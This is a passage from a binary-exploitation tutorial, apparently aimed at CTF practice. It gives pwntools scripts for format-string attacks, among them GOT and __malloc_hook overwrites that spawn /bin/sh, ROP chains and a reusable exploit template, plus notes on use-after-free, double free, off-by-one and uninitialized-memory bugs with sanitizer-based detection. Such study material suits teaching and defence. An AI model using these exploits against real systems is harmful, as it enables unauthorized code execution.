**Concept:** Use `%n` to write the number of bytes output so far to an address on the stack.

**Basic Write (32-bit):**

```python
#!/usr/bin/env python3
from pwn import *

p = process('./vulnerable32')

# Target: Write 0xdeadbeef to address 0x0804a020
target_addr = 0x0804a020
value_to_write = 0xdeadbeef

# Assume buffer at offset 4
buffer_offset = 4

# Strategy: Write in chunks using %hn (16-bit writes)
# Lower 16 bits: 0xbeef
# Upper 16 bits: 0xdead

lower = value_to_write & 0xFFFF  # 0xbeef = 48879
upper = (value_to_write >> 16) & 0xFFFF  # 0xdead = 57005

# Build payload
payload = p32(target_addr)        # Write location (lower half)
payload += p32(target_addr + 2)   # Write location (upper half)

# Write lower 16 bits first
payload += f"%{lower - 8}c".encode()  # Subtract 8 for addresses written
payload += f"%{buffer_offset}$hn".encode()

# Write upper 16 bits (need to output more bytes)
# Total so far: lower (48879)
# Need: upper (57005)
# Additional: 57005 - 48879 = 8126 (but wraps, so add 65536)
additional = (upper - lower) % 65536
payload += f"%{additional}c".encode()
payload += f"%{buffer_offset + 1}$hn".encode()

p.sendline(payload)
p.interactive()
```

**Efficient Write (using % formats):**

```python
#!/usr/bin/env python3
from pwn import *

def fmt_write_32(addr, value, offset):
    """
    Write 32-bit value to address using format string
    addr: target address
    value: value to write
    offset: stack offset where our buffer starts
    """
    # Split into 4 bytes
    bytes_to_write = [
        value & 0xFF,
        (value >> 8) & 0xFF,
        (value >> 16) & 0xFF,
        (value >> 24) & 0xFF
    ]
    
    # Sort by value to minimize padding
    writes = [(bytes_to_write[i], addr + i, offset + i) 
              for i in range(4)]
    writes.sort(key=lambda x: x[0])
    
    payload = b""
    # Write addresses
    for _, write_addr, _ in writes:
        payload += p32(write_addr)
    
    # Write values
    written = len(payload)
    for byte_val, _, stack_offset in writes:
        if byte_val > written:
            padding = byte_val - written
        else:
            padding = (byte_val + 256) - written
        
        payload += f"%{padding}c".encode()
        payload += f"%{stack_offset}$hhn".encode()
        written = byte_val
    
    return payload

# Usage
p = process('./vulnerable32')
target = 0x0804a020
value = 0xdeadbeef
offset = 4

payload = fmt_write_32(target, value, offset)
p.sendline(payload)
p.interactive()
```

**64-bit Write:**

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'

p = process('./vulnerable64')

# Write 64-bit value 0x00007f1234567890
target_addr = 0x601050
value = 0x00007f1234567890

# Buffer at offset 6
offset = 6

# Strategy: 8-byte write or multiple 2-byte writes
# Using %hhn for byte-by-byte (8 writes)

payload = b""
written = 0

for i in range(8):
    payload += p64(target_addr + i)

for i in range(8):
    byte_val = (value >> (i * 8)) & 0xFF
    
    if byte_val >= written:
        padding = byte_val - written
    else:
        padding = (byte_val + 256) - written
    
    if padding > 0:
        payload += f"%{padding}c".encode()
    
    payload += f"%{offset + i}$hhn".encode()
    written = (written + padding) % 256

p.sendline(payload)
p.interactive()
```

#### Technique 3: GOT Overwrite

**Goal:** Overwrite GOT entry to redirect function call.

**Full Exploit Example:**

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'i386'
context.log_level = 'debug'

binary = './format_vuln'
elf = ELF(binary)
libc = ELF('/lib/i386-linux-gnu/libc.so.6')

# Step 1: Leak libc address
p = process(binary)

# Leak printf GOT
printf_got = elf.got['printf']
payload = p32(printf_got) + b"%6$s"

p.sendline(payload)
p.recvuntil(b"s")
leaked_printf = u32(p.recv(4))

libc_base = leaked_printf - libc.symbols['printf']
system_addr = libc_base + libc.symbols['system']
bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))

log.success(f"Libc base: {hex(libc_base)}")
log.success(f"System: {hex(system_addr)}")
log.success(f"/bin/sh: {hex(bin_sh_addr)}")

# Step 2: Overwrite exit@GOT with system
# So exit("/bin/sh") becomes system("/bin/sh")

exit_got = elf.got['exit']

# Build write payload
payload = p32(exit_got) + p32(exit_got + 2)

lower = system_addr & 0xFFFF
upper = (system_addr >> 16) & 0xFFFF

payload += f"%{lower - 8}c%6$hn".encode()
payload += f"%{(upper - lower) % 65536}c%7$hn".encode()

p.sendline(payload)

# Step 3: Trigger exit() with "/bin/sh" argument
# (depends on binary implementation)
p.sendline(b"/bin/sh")

p.interactive()
```

#### Technique 4: Stack Pivot via Return Address Overwrite

**Concept:** Overwrite saved return address on stack to redirect execution.

**Finding Return Address Offset:**

```bash
gdb ./binary
break vulnerable_function
run
info frame
# Note saved RIP location

# Calculate stack offset
# If RIP at 0x7fffffffe488
# Buffer at 0x7fffffffe400
# Offset in words: (0x488 - 0x400) / 8 = 17

# In format string context:
# Find where buffer appears: %N$p
# RIP offset = N + 17
```

**Exploit:**

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'

p = process('./format_64')
elf = ELF('./format_64')

# Assume buffer at offset 6, RIP at offset 23

rip_stack_addr = 0x7fffffffe488  # From GDB or leak
win_func = elf.symbols['win']

# Write win address to RIP location
# Split into 3 16-bit writes (48 bits, upper 16 usually 0)

payload = p64(rip_stack_addr)
payload += p64(rip_stack_addr + 2)
payload += p64(rip_stack_addr + 4)

lower = win_func & 0xFFFF
mid = (win_func >> 16) & 0xFFFF
upper = (win_func >> 32) & 0xFFFF

written = 24  # 3 addresses

if lower > written:
    payload += f"%{lower - written}c".encode()
else:
    payload += f"%{(lower + 65536) - written}c".encode()
payload += b"%6$hn"

written = lower
if mid > written:
    payload += f"%{mid - written}c".encode()
else:
    payload += f"%{(mid + 65536) - written}c".encode()
payload += b"%7$hn"

written = mid
if upper > written:
    payload += f"%{upper - written}c".encode()
else:
    payload += f"%{(upper + 65536) - written}c".encode()
payload += b"%8$hn"

p.sendline(payload)
p.interactive()
```

### Format String Exploitation Tools

**pwntools fmtstr Module:**

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'

# Automatic format string exploitation
def send_payload(payload):
    p = process('./vulnerable')
    p.sendline(payload)
    return p.recvall()

# Automatically find offset
autofmt = FmtStr(send_payload)
offset = autofmt.offset
log.info(f"Buffer offset: {offset}")

# Automatic write
p = process('./vulnerable')
fmt = FmtStr(execute_fmt=p.sendline, offset=offset)

# Write value to address
target_addr = 0x601050
value = 0xdeadbeef
fmt.write(target_addr, value)

# Execute arbitrary writes
fmt.execute_writes()

p.interactive()
```

**Manual Offset Finding:**

```python
#!/usr/bin/env python3
from pwn import *

def find_offset(binary):
    """Find stack offset where format string buffer appears"""
    for i in range(1, 50):
        try:
            p = process(binary, level='error')
            
            # Send unique pattern + format specifier
            payload = b"AAAA" + f"%{i}$p".encode()
            p.sendline(payload)
            
            response = p.recvall(timeout=1)
            p.close()
            
            # Check if we read our own buffer (0x41414141)
            if b'0x41414141' in response or b'0x61616161' in response:
                log.success(f"Found offset: {i}")
                return i
        except:
            continue
    
    log.error("Offset not found")
    return None

# Usage
offset = find_offset('./vulnerable')
```

**Format String Builder:**

```python
#!/usr/bin/env python3
from pwn import *

class FormatStringExploit:
    def __init__(self, offset, arch='i386'):
        self.offset = offset
        self.arch = arch
        self.writes = []
        
    def add_write(self, addr, value, size=4):
        """
        Add a write operation
        size: 1 (byte), 2 (short), 4 (int), 8 (long)
        """
        self.writes.append((addr, value, size))
    
    def generate_payload(self):
        """Generate optimized format string payload"""
        if self.arch == 'i386':
            pack_func = p32
            ptr_size = 4
        else:
            pack_func = p64
            ptr_size = 8
        
        # Expand writes into byte writes for simplicity
        byte_writes = []
        for addr, value, size in self.writes:
            for i in range(size):
                byte_val = (value >> (i * 8)) & 0xFF
                byte_writes.append((addr + i, byte_val))
        
        # Sort by value to minimize padding
        byte_writes.sort(key=lambda x: x[1])
        
        # Build payload
        payload = b""
        
        # Write all addresses first
        for addr, _ in byte_writes:
            payload += pack_func(addr)
        
        # Write values
        written = len(payload)
        
        for idx, (addr, byte_val) in enumerate(byte_writes):
            # Calculate padding needed
            if byte_val >= written % 256:
                padding = byte_val - (written % 256)
            else:
                padding = (byte_val + 256) - (written % 256)
            
            if padding > 0:
                payload += f"%{padding}c".encode()
                written += padding
            
            # Write byte
            stack_pos = self.offset + idx
            payload += f"%{stack_pos}$hhn".encode()
        
        return payload

# Usage example
exploit = FormatStringExploit(offset=6, arch='amd64')

# Write 0xdeadbeef to 0x601050
exploit.add_write(0x601050, 0xdeadbeef, size=4)

# Write 0x401234 to 0x601060
exploit.add_write(0x601060, 0x401234, size=8)

payload = exploit.generate_payload()
print(f"Payload length: {len(payload)}")
```

### Advanced Format String Techniques

#### Technique 5: RELRO Bypass (Partial RELRO)

**Concept:** Overwrite GOT entries even with Partial RELRO (Full RELRO makes GOT read-only).

```bash
# Check RELRO status
checksec --file=./binary

# Partial RELRO: GOT is writable after initialization
# Full RELRO: GOT is completely read-only
```

**Exploitation:**

```python
#!/usr/bin/env python3
from pwn import *

binary = './partial_relro'
elf = ELF(binary)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

p = process(binary)

# Step 1: Leak libc via format string
puts_got = elf.got['puts']

payload = p64(puts_got)
payload += b"%6$s"

p.sendline(payload)
p.recvuntil(b"s")

leaked_puts = u64(p.recv(6).ljust(8, b'\x00'))
libc_base = leaked_puts - libc.symbols['puts']
system = libc_base + libc.symbols['system']

log.success(f"System @ {hex(system)}")

# Step 2: Overwrite atoi@GOT with system
# Next atoi() call will execute system
atoi_got = elf.got['atoi']

# Prepare write
exploit = FormatStringExploit(offset=6, arch='amd64')
exploit.add_write(atoi_got, system, size=8)

payload = exploit.generate_payload()
p.sendline(payload)

# Step 3: Trigger atoi("/bin/sh") → system("/bin/sh")
p.sendline(b"/bin/sh")
p.interactive()
```

#### Technique 6: __malloc_hook / __free_hook Overwrite

**Concept:** Overwrite libc hooks to gain code execution on next malloc/free call.

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'

binary = './format_vuln'
elf = ELF(binary)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

p = process(binary)

# Leak libc base (assume we have this capability)
# ... leak code here ...
libc_base = 0x7ffff7a00000  # Example

# Calculate addresses
malloc_hook = libc_base + libc.symbols['__malloc_hook']
one_gadget = libc_base + 0x4526a  # one_gadget offset (find with one_gadget tool)

log.info(f"__malloc_hook @ {hex(malloc_hook)}")
log.info(f"one_gadget @ {hex(one_gadget)}")

# Overwrite __malloc_hook with one_gadget
# Next malloc() will execute one_gadget → shell

exploit = FormatStringExploit(offset=6, arch='amd64')
exploit.add_write(malloc_hook, one_gadget, size=8)

payload = exploit.generate_payload()
p.sendline(payload)

# Trigger malloc
p.sendline(b"trigger")  # Depends on binary
p.interactive()
```

**Finding one_gadget:**

```bash
# Install one_gadget
gem install one_gadget

# Find one_gadgets in libc
one_gadget /lib/x86_64-linux-gnu/libc.so.6

# Example output:
# 0x4526a execve("/bin/sh", rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL
#
# 0xf02a4 execve("/bin/sh", rsp+0x50, environ)
# constraints:
#   [rsp+0x50] == NULL
```

#### Technique 7: Stack Canary Bypass

**Leak and Preserve Canary:**

```python
#!/usr/bin/env python3
from pwn import *

p = process('./format_canary')

# Step 1: Leak canary via format string
# Find canary position (looks like 0xXXXXXXXXXXXXXX00)
for i in range(1, 30):
    test = process('./format_canary', level='error')
    test.sendline(f"%{i}$p".encode())
    response = test.recvall()
    test.close()
    
    if b'00\n' in response:  # Canary ends with 00
        log.info(f"Potential canary at offset {i}")

# Assume canary at offset 11
payload = b"%11$p"
p.sendline(payload)

canary = int(p.recvline().strip(), 16)
log.success(f"Leaked canary: {hex(canary)}")

# Step 2: Use canary in overflow exploit
# (combined with format string if multiple vulns exist)

p.interactive()
```

#### Technique 8: Blind Format String Exploitation

**Concept:** Exploit without seeing output (e.g., syslog, remote service).

**Brute Force Approach:**

```python
#!/usr/bin/env python3
from pwn import *

context.log_level = 'error'

def test_crash(payload):
    """Check if payload causes crash"""
    try:
        p = remote('target', 1337, level='error')
        p.sendline(payload)
        response = p.recvall(timeout=2)
        p.close()
        return False  # No crash
    except:
        return True  # Crashed

# Find offset by causing crashes
for i in range(1, 50):
    payload = f"%{i}$s".encode()
    if test_crash(payload):
        log.info(f"Crash at offset {i} (invalid address read)")

# Leak byte-by-byte using timing or crash behavior
def leak_byte(address, byte_offset):
    """Leak single byte by testing values"""
    for byte_val in range(256):
        # Write byte and check if binary behaves differently
        test_payload = construct_write(address, byte_val)
        # Analyze response timing, behavior, etc.
        pass
```

#### Technique 9: Format String + ROP Chain

**Concept:** Use format string to write ROP chain onto stack.

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'

binary = './rop_format'
elf = ELF(binary)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

p = process(binary)

# Leak stack address to know where to write
payload = b"%6$p"  # Leak stack pointer
p.sendline(payload)

stack_leak = int(p.recvline().strip(), 16)
log.info(f"Stack leak: {hex(stack_leak)}")

# Calculate return address location
rip_addr = stack_leak + 0x100  # Offset to saved RIP

# Leak libc
# ... leak libc base ...
libc_base = 0x7ffff7a00000  # Example

# Build ROP chain
rop = ROP(libc)
rop.call(libc_base + libc.symbols['system'], [libc_base + next(libc.search(b'/bin/sh'))])

# Write ROP chain using format string
# Each gadget address needs to be written to consecutive stack locations

current_addr = rip_addr

for gadget in rop.chain():
    # Write 8 bytes at current_addr
    exploit = FormatStringExploit(offset=6, arch='amd64')
    exploit.add_write(current_addr, gadget, size=8)
    
    payload = exploit.generate_payload()
    p.sendline(payload)
    
    current_addr += 8

p.interactive()
```

### Format String Debugging

**GDB Analysis:**

```bash
gdb ./format_vuln

# Break at printf
break printf
run

# Examine stack when printf is called
x/40gx $rsp  # 64-bit
x/40wx $esp  # 32-bit

# Identify parameter positions
# First parameter: format string pointer
# Subsequent: arguments (or stack data if missing)

# Test format string manually
set $arg = (char*) malloc(100)
call strcpy($arg, "%p.%p.%p.%p")
call printf($arg)

# Check where buffer appears
set $arg = (char*) malloc(100)
call strcpy($arg, "AAAA%p.%p.%p.%p.%p.%p.%p.%p")
call printf($arg)
# Look for 0x41414141 in output
```

**Format String Fuzzer:**

```python
#!/usr/bin/env python3
from pwn import *
import string

def fuzz_format_string(binary, max_offset=50):
    """Find useful information via format string fuzzing"""
    
    results = {
        'buffer_offset': None,
        'canary_offset': None,
        'code_pointers': [],
        'libc_pointers': []
    }
    
    for i in range(1, max_offset):
        try:
            p = process(binary, level='error')
            
            # Test with marker
            marker = 0x4141414142424242
            payload = p64(marker) + f"%{i}$p".encode()
            p.sendline(payload)
            
            response = p.recvall(timeout=1).decode(errors='ignore')
            p.close()
            
            # Check if we found our buffer
            if '4141414142424242' in response or '42424242' in response:
                results['buffer_offset'] = i
                log.success(f"Buffer at offset {i}")
            
            # Check for canary (ends with 00)
            if '00' in response[-2:]:
                results['canary_offset'] = i
                log.info(f"Potential canary at offset {i}")
            
            # Check for code pointers (start with 0x55 or 0x40)
            if '0x55' in response or '0x40' in response:
                results['code_pointers'].append(i)
                log.info(f"Code pointer at offset {i}: {response.strip()}")
            
            # Check for libc pointers (start with 0x7f)
            if '0x7f' in response:
                results['libc_pointers'].append(i)
                log.info(f"Libc pointer at offset {i}: {response.strip()}")
                
        except:
            continue
    
    return results

# Usage
results = fuzz_format_string('./vulnerable')
print(json.dumps(results, indent=2))
```

### Format String Protection Bypass

**FORTIFY_SOURCE:**

```bash
# FORTIFY_SOURCE adds runtime checks
gcc -D_FORTIFY_SOURCE=2 -O2 source.c -o binary

# Checks:
# - Format string must be constant
# - Number of % matches arguments
```

**Bypass:**

- Exploit occurs before checks trigger
- Use within loops where format string changes
- Race conditions in multi-threaded apps

**Stack Protector (SSP):**

```python
# If format string doesn't reach canary:
# - Leak canary via format string
# - Use leaked canary in overflow exploit

# If format string can overwrite:
# - Write original canary value back
# - Or overwrite __stack_chk_fail GOT entry
```

**PIE (Position Independent Executable):**

```python
# Leak code pointer via format string
# Calculate PIE base
# Use leaked addresses in subsequent writes
```

### Common Format String Patterns in CTFs

**Pattern 1: Two-Stage Exploit**

```python
# Stage 1: Leak addresses
p.sendline(leak_payload)
leaked_data = parse_leaks(p.recvline())

# Stage 2: Write to leaked/calculated addresses
p.sendline(write_payload)
```

**Pattern 2: Loop Exploitation**

```python
# Binary has format string in loop
while True:
    try:
        payload = input("cmd: ")
        printf(payload)  # Vulnerable!
    except:
        break

# Exploit: Multiple rounds of leak + write
```

**Pattern 3: Limited Length**

```python
# Format string has length limit (e.g., 50 bytes)
# Solution: Use direct parameter access
# %7$n is shorter than padding + %n

# Or: Multiple rounds if loop exists
```

**Pattern 4: Filtered Characters**

```python
# Some characters filtered (%, $, etc.)
# Bypass: 
# - URL encoding if web app
# - Hex encoding: \x25 = %
# - Alternative format: use positional without $
```

### Format String Checklist

**Reconnaissance:**

```
□ Identify format string vulnerability
□ Find stack offset where buffer appears
□ Determine architecture (32/64-bit)
□ Check protections (checksec)
□ Identify leak targets (canary, PIE, libc)
□ Find write targets (GOT, hooks, return address)
```

**Exploitation:**

```
□ Leak necessary addresses
□ Calculate offsets/bases
□ Build write payload
□ Test payload length limits
□ Verify writes (if multiple rounds possible)
□ Trigger execution (return/call hijacked function)
```

**Common Issues:**

```
□ Wrong stack offset → Adjust offset
□ Payload too long → Use direct access (%N$)
□ Partial writes → Check byte order, use multiple writes
□ Crashes on write → Verify target address is writable
□ No execution → Check if write actually occurred
```

### Format String Exploitation Template

```python
#!/usr/bin/env python3
from pwn import *

# Configuration
binary_path = './vuln'
libc_path = '/lib/x86_64-linux-gnu/libc.so.6'
context.binary = binary_path
context.log_level = 'debug'

elf = ELF(binary_path)
libc = ELF(libc_path)

# Connection
p = process(binary_path)
# p = remote('target.com', 1337)

# Stage 1: Find offset (if unknown)
# offset = find_offset(binary_path)
offset = 6  # Example

# Stage 2: Leak libc
puts_got = elf.got['puts']

leak_payload = p64(puts_got)
leak_payload += f"%{offset}$s".encode()

p.sendline(leak_payload)
p.recvuntil(b"s")

leaked_puts = u64(p.recv(6).ljust(8, b'\x00'))
libc_base = leaked_puts - libc.symbols['puts']
system = libc_base + libc.symbols['system']
bin_sh = libc_base + next(libc.search(b'/bin/sh'))

log.success(f"Libc base: {hex(libc_base)}")
log.success(f"system: {hex(system)}")

# Stage 3: Overwrite target
target = elf.got['exit']  # Or __malloc_hook, etc.

exploit = FormatStringExploit(offset=offset, arch='amd64')
exploit.add_write(target, system, size=8)

write_payload = exploit.generate_payload()
p.sendline(write_payload)

# Stage 4: Trigger
p.sendline(b"/bin/sh")
p.interactive()
```

This completes the Memory Corruption Vulnerabilities section covering stack-based buffer overflows, heap-based buffer overflows, integer overflow/underflow, and format string vulnerabilities with practical exploitation techniques and tools.

---

## Use-After-Free (UAF)

Use-after-free occurs when code dereferences a pointer after the referenced memory has been freed, potentially allowing arbitrary code execution through heap spraying or control of freed memory contents.

**Vulnerability mechanics**

Memory allocation and deallocation:

```c
void *ptr = malloc(0x100);
free(ptr);              // Memory returned to heap
ptr[0] = 0x41;          // UAF: Write to freed memory
printf("%p\n", *ptr);   // UAF: Read from freed memory
```

Freed memory remains accessible until reallocated. Attacker controls reallocation contents, achieving write primitives or information disclosure.

**Recognition in assembly**

Pattern identification:

```
mov rdi, rax            // Object pointer
call free@plt           // Free object
mov rax, [rdi]          // UAF: Dereference after free
```

Disassembly inspection:

```bash
objdump -d /path/to/binary | grep -B 10 "call free" | tail -20
```

Look for continued memory access to freed variable without reallocation.

**Radare2 analysis:**

```bash
r2 /path/to/binary
> aaa
> pdf @ vulnerable_function
```

Trace variable usage across free() calls.

**Static detection via source code review:**

```c
struct node *ptr = malloc(...);
// ... operations ...
free(ptr);
ptr->field = value;     // UAF vulnerability
```

**Runtime detection via GDB:**

```bash
gdb ./binary
(gdb) break malloc
(gdb) break free
(gdb) commands
> silent
> set $last_malloc = $rax
> printf "malloc: %p\n", $rax
> continue
> end
(gdb) break free
(gdb) commands
> printf "freeing: %p\n", $rdi
> continue
> end
(gdb) run input_file
```

Monitor malloc/free sequence, verify no access post-free.

**Exploitation: arbitrary read**

Controlled object allocation after free achieves arbitrary read:

```c
struct object {
    void (*func_ptr)(void);
    char *data;
};

// Attacker-controlled allocation fills freed object
struct object *attacker_obj = malloc(sizeof(struct object));
attacker_obj->data = (char *)target_address;

// Code dereferences UAF pointer expecting original object
original_ptr->func_ptr();  // func_ptr points to target_address contents
```

**PoC exploitation technique:**

1. Trigger vulnerability to free object at known heap location
2. Allocate attacker-controlled object of same size, landing at freed address
3. Set fields to point to target addresses or contain gadget pointers
4. Trigger code path dereferencing UAF pointer, achieving arbitrary read/execute

**Exploitation: arbitrary write**

```c
void (*callback)(void) = &safe_function;
void *ptr = malloc(0x100);
free(ptr);

// Attacker reallocates freed memory with callback pointing to gadget
struct payload *p = (struct payload *)malloc(0x100);
p->callback = &dangerous_function;

// UAF dereferences callback
callback();  // Executes attacker-controlled function
```

**Heap spray technique:**

Before triggering UAF, allocate many identical objects filling heap:

```python
# Pseudo-code: heap spray
for i in range(1000):
    allocate_sprayed_object()  # Size matching vulnerable object
```

When vulnerable allocation frees and reallocates, attacker-controlled spray objects occupy positions, ensuring predictable heap layout.

**Detection via AddressSanitizer:**

Compile target with ASAN:

```bash
gcc -fsanitize=address -g program.c -o program
./program input
```

ASAN detects UAF at runtime:

```
ERROR: AddressSanitizer: heap-use-after-free on address 0x60200000eff0
READ of size 8 at 0x60200000eff0 thread T0
    #0 0x46a189 in main program.c:12
    #1 0x7f1234567890 in __libc_start_main libc.so.6
```

**Valgrind detection:**

```bash
valgrind --leak-check=full --show-leak-kinds=all ./program input
```

Valgrind reports UAF with stack trace.

**Heap exploitation tools:**

**gdb-heap extension:**

```bash
gdb ./binary
(gdb) source /path/to/gdb-heap/heap.py
(gdb) heap bins
(gdb) heap chunks
(gdb) heap inuse
```

Visualizes heap state, identifying freed chunk locations.

**Pwn tools heap debugging:**

```python
from pwn import *
p = process('./binary')
# Trigger heap state at interest point
gdb.attach(p, gdbscript="""
break *0x[address]
continue
heap inuse
quit
""")
```

---

## Double Free

Double free occurs when `free()` is called twice on the same pointer, corrupting heap metadata and enabling arbitrary code execution through heap manipulation.

**Vulnerability mechanics**

```c
void *ptr = malloc(0x100);
free(ptr);
free(ptr);              // Double free - UB
```

Modern glibc detects simple double frees through fastbin list checks. Exploitation requires bypassing detection via fastbin size confusion or exploiting double free in different heap regions.

**Glibc double free protections**

Fastbin consistency check (glibc 2.26+):

```c
// In malloc.c glibc source
if (__builtin_expect (old == p, 0)) {
    errstr = "double free or corruption (fasttop)";
    goto errout;
}
```

Checks if freed chunk appears immediately after previous free. Bypasses require intervening allocations or exploiting unsorted bin.

**Recognition in assembly**

```
lea rdi, rax            // Chunk pointer
call free@plt           // First free
lea rdi, rax            // Same pointer
call free@plt           // Second free - vulnerability
```

Code path analysis reveals same pointer freed twice:

```bash
r2 /path/to/binary
> aaa
> pdf @ vulnerable_function
```

Trace `rdi` register across multiple `free@plt` calls.

**Dynamic detection:**

```bash
gdb ./binary
(gdb) break free
(gdb) commands
> printf "free(%p)\n", $rdi
> continue
> end
(gdb) run
```

Repeated free addresses indicate double free.

**Exploitation via fastbin attack**

Glibc fastbin management allows limited double free exploitation when size confusion occurs:

```
Fastbin structure (simplified):
[0x20] -> chunk1 -> chunk2 -> chunk3 -> NULL

After double free:
[0x20] -> chunk1 -> chunk1 (corrupted)
```

Attacker exploits by:

1. Allocating chunk of size S
2. Freeing chunk (enters fastbin[S])
3. Freeing same chunk again (now at list head twice)
4. Allocating twice with size S
    - First allocation returns chunk
    - Second allocation returns same chunk
5. Both allocations point to same memory, enabling corruption

**PoC double free exploitation:**

```c
#include <stdlib.h>
#include <stdio.h>

int main() {
    char *a = malloc(0x50);
    char *b = malloc(0x50);
    char *c = malloc(0x50);
    
    free(a);
    free(b);
    free(a);            // Double free - now fastbin is corrupted
    
    char *x = malloc(0x50);  // Gets a
    char *y = malloc(0x50);  // Gets b
    char *z = malloc(0x50);  // Gets a again - same as x!
    
    x[0] = 'A';
    z[0] = 'B';        // Overwrites x's memory
    printf("%c\n", x[0]);  // Prints 'B'
    
    return 0;
}
```

**Unsorted bin exploitation**

Double free into unsorted bin (larger chunks) allows bypassing fastbin checks:

```c
void *ptr = malloc(0x500);  // Large allocation, uses unsorted bin
free(ptr);
free(ptr);  // Double free in unsorted bin
```

Unsorted bin uses different corruption detection, potentially exploitable with heap grooming.

**Glibc 2.29+ protections**

Key-based double free detection:

```c
// In glibc 2.29+
typedef struct {
    uint64_t key;
} mchunk_t;

// Free operation stores key in freed chunk
// Subsequent free checks key validity
if (chunk_key != stored_key) {
    errstr = "double free or corruption";
}
```

Defeats simple double free, requiring leaked heap addresses for key prediction.

**Detection via AddressSanitizer:**

```bash
gcc -fsanitize=address program.c -o program
./program
```

Output:

```
ERROR: AddressSanitizer: attempting double-free on 0x60200000eff0
```

**Valgrind detection:**

```bash
valgrind ./program
```

Reports:

```
Invalid free() / delete / delete[] / realloc()
```

---

## Off-by-One Errors

Off-by-one errors allocate insufficient buffer space or iterate incorrectly, enabling single-byte overwrites of critical metadata or adjacent data structures.

**Buffer allocation off-by-one**

```c
char *buf = malloc(strlen(input));  // Off-by-one: missing null terminator space
strcpy(buf, input);                  // Writes one byte beyond allocation
```

Single-byte overflow corrupts adjacent heap metadata or next chunk's size field.

**Loop iteration off-by-one**

```c
void copy_array(int *src, int *dst, int len) {
    for (int i = 0; i <= len; i++) {  // Should be i < len
        dst[i] = src[i];              // Accesses one extra element
    }
}
```

Writes to memory beyond intended buffer.

**String operation off-by-one**

```c
char buf[10];
strncpy(buf, input, 10);  // Off-by-one: no null terminator written
buf[9] = '\0';            // Explicitly required, easy to miss
```

Incomplete null termination enables string overread attacks.

**Recognition in assembly**

Loop boundary checks reveal off-by-one:

```
mov ecx, 0              // Loop counter
mov eax, [rbp-0x8]      // Length value
.loop:
cmp ecx, eax
jle .body               // Should be jl (less than, not less-or-equal)
jmp .exit
.body:
mov [rdi+rcx*4], ...
inc ecx
jmp .loop
```

`jle` instead of `jl` indicates off-by-one loop.

**Radare2 analysis:**

```bash
r2 /path/to/binary
> aaa
> pdf @ loop_function
```

Examine loop exit condition, verify correctness.

**Exploitation: heap metadata corruption**

Off-by-one into next chunk's size field:

```c
struct chunk_header {
    uint64_t size;
    uint64_t prev_size;
};

char buf[0x100];
strcpy(buf, user_input);     // Off-by-one: overwrites chunk->size

// Next free() sees corrupted size, exploitable
free(ptr);
```

Corrupt size field to claim large block during subsequent allocation, achieving heap overflow.

**Exploitation: integer truncation**

Off-by-one combined with integer operations:

```c
void read_data(int size) {
    char buf[size];         // Stack allocation
    read(fd, buf, size + 1);  // Off-by-one write to stack
}
```

Single byte overwrites return address or saved registers.

**Exploitation: string null terminator**

Off-by-one preventing null termination:

```c
char buf[10];
strncpy(buf, user_input, 10);  // No null terminator
printf("%s", buf);             // String overread to next null byte
```

Information disclosure via reading beyond intended buffer.

**PoC off-by-one exploitation:**

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void vulnerable(char *input) {
    char buf[10];
    strcpy(buf, input);     // Off-by-one: no bounds checking
    // Overflow into stack
}

int main() {
    char payload[50];
    memset(payload, 'A', 20);
    payload[20] = '\x00';
    vulnerable(payload);
    return 0;
}
```

**Detection via AddressSanitizer:**

```bash
gcc -fsanitize=address program.c -o program
./program $(python3 -c "print('A'*20)")
```

Output:

```
ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7ffe...
```

**Manual detection via GDB:**

```bash
gdb ./binary
(gdb) break vulnerable
(gdb) run $(python3 -c "print('A'*20)")
(gdb) info locals
(gdb) x/20x $rbp-0x10    # Examine stack above buffer
```

Verify overflow into adjacent stack variables.

**Runtime instrumentation:**

```bash
valgrind --tool=memcheck ./program $(python3 -c "print('A'*20)")
```

Reports:

```
Address 0x... is 1 bytes inside a block of size 10 alloc'd
```

---

## Uninitialized Memory Bugs

Uninitialized memory contains previous data, enabling information disclosure or exploitation through stack/heap spray techniques. Particularly dangerous with stack variables and heap chunks.

**Stack uninitialized variables**

```c
void process() {
    int secret;             // Uninitialized
    printf("%d\n", secret); // Reads garbage from stack
}
```

Stack contains leftover data from previous function calls, leaking sensitive information.

**Heap uninitialized allocation**

```c
void *ptr = malloc(0x100);
// Memory not zeroed, contains previous allocation's data
memcpy(destination, ptr, 0x100);  // Copies garbage
```

Standard `malloc()` doesn't zero memory (unlike `calloc()`). Previous allocation's data persists if not overwritten.

**Recognition in assembly**

Variables used without initialization:

```
sub rsp, 0x10            // Allocate stack space
mov rax, [rbp-0x8]       // Read uninitialized variable
```

No preceding assignment before use indicates uninitialized access.

**Radare2 analysis:**

```bash
r2 /path/to/binary
> aaa
> pdf @ function
```

Examine variable first use without prior assignment.

**Use-case: information disclosure**

Attacker triggers uninitialized read, leaking:

- Heap addresses (de-ASLR)
- Stack canary values
- Previous function's local data
- Cryptographic keys

**PoC uninitialized read:**

```c
#include <stdio.h>
#include <stdlib.h>

void leak_stack() {
    char buf[10];
    // buf uninitialized
    for (int i = 0; i < 10; i++) {
        printf("%02x ", (unsigned char)buf[i]);
    }
    printf("\n");
}

int sensitive_function() {
    int secret = 0xdeadbeef;
    return secret;
}

int main() {
    sensitive_function();
    leak_stack();  // Prints stack contents including secret
    return 0;
}
```

**Exploitation via heap spray**

Before triggering uninitialized read, spray heap with controlled data:

```python
# Pseudo-code: heap spray
p = process('./binary')
for i in range(1000):
    p.send(b'A' * 0x1000)  # Allocate/free pattern
    
# Trigger uninitialized read, receives sprayed data
leak = p.recv(0x100)
```

Attacker controls heap contents before uninitialized allocation, predicting leaked data.

**Exploitation via stack spray (ROP)**

Before triggering uninitialized stack read:

```python
# Make many function calls to fill stack with controlled values
p = process('./binary')
for i in range(100):
    p.send(b'AAAA')  # Trigger function calls

# Uninitialized read leaks stack data containing controlled values
leak = p.recv(0x100)
```

